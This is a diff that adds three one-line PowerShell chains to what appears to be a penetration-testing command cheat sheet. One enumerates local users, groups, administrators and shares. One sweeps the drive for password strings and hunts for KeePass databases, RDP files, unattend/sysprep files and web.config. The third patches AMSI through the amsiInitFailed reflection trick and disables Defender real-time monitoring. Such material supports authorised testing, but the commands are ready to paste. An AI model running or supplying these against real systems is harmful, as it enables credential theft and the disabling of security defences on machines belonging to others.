@@ -5,6 +5,41 @@
 <!-- tags: windows, powershell, post, enum, cmdlets -->
 <!-- platform: windows -->
 
+> **Chain entries** combine common PowerShell cmdlet sequences into one Ctrl+Q. All use `;` so an empty result or ACL rejection on one cmdlet doesn't block the next.
+
+---
+
+## powershell chain host enum
+Local users + local groups + Administrators members + registered owner + WMI shares + WinRM reachability. The "what is this host" survey in one line.
+
+```bash
+Get-LocalUser ; Get-LocalGroup ; Get-LocalGroupMember -Group Administrators ; Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object RegisteredOwner,RegisteredOrganization ; Get-WmiObject -Class Win32_Share ; Test-WSMan localhost
+```
+
+<!-- meta: risk=low | phase=enum | tags=powershell,chain,enum,localuser,group,shares,winrm -->
+
+---
+
+## powershell chain creds and sensitive files
+Recursive password-string sweep across common config extensions + sensitive-file hunt (RDP/KeePass/unattend/sysprep/web.config) + last 20 security events. Three creds-hunt primitives bundled.
+
+```bash
+Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object Path,Line -First 50 ; Get-ChildItem -Path C:\Users -Recurse -Include *.rdp,*.kdbx,*unattend*.xml,*sysprep*.xml,*web.config* -ErrorAction SilentlyContinue ; Get-WinEvent -LogName Security -MaxEvents 20
+```
+
+<!-- meta: risk=medium | phase=credaccess | tags=powershell,chain,creds,files,unattend,eventlog -->
+
+---
+
+## powershell chain amsi and defender bypass
+Classic AMSI amsiInitFailed patch + Defender real-time monitoring kill. VERY LOUD — EDR flags both. Only on boxes you fully own; prefer AMSI-only on short-lived shells.
+
+```bash
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) ; Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+<!-- meta: risk=high | phase=evasion | tags=powershell,chain,amsi,defender,bypass,opsec -->
+
 ---
 
 ## reveal hidden items windows
